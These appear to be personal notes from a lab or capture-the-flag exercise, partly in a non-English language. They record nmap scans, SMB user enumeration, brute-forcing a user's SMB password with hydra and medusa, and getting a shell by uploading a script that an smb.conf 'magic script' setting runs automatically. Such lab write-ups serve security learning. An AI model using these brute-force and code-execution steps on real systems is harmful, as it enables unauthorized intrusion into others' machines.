
nmap -sn 192.168.99.1/24 

nmap 192.168.99.28 

nmap -sC -sV 192.168.99.28

smbmap -H 192.168.99.28   => enumanate  => we got nothing

enum4linux 192.168.99.28   =>  we got username

![[Pasted image 20230114225608.png]]

nmap 192.168.99.28 --script=smb-enum-users -sV   => best one  => we got user too


![[Pasted image 20230114225639.png]]

-----

we try to get smb password with hydra tool

** hydra -l albert -P /usr/share/wordlists/rockyou.txt 192.168.99.28 smb -t 1

-t option for time => 1 request per time


** medusa -h 192.168.99.28 -u albert -P /usr/share/wordlists/rockyou.txt -M smbnt  => nice dal

Finally we get user name and paswrd 
username -> albert 
password -> bradley1

smbmap -H 192.168.99.28 -u albert -p 'bradley1'    => we are entering again

smbclient //192.168.99.28/albert -U albert    => we are going to albert folder

smbconf twe mar a ye kyi sone ka * magic script file bal* => cuzz auto run mot

![[Pasted image 20230115152519.png]]


subl smbscript.txt    => we create this file * file name must be same with magic script file*

=> smbshare folder htal ko win twar dal
smbclient //192.168.99.28/smbshare -U albert

![[Pasted image 20230115155526.png]]

rename smbscript.txt smbscript.sh  => we change txt file to sh file

 ######### we got user 





 

  

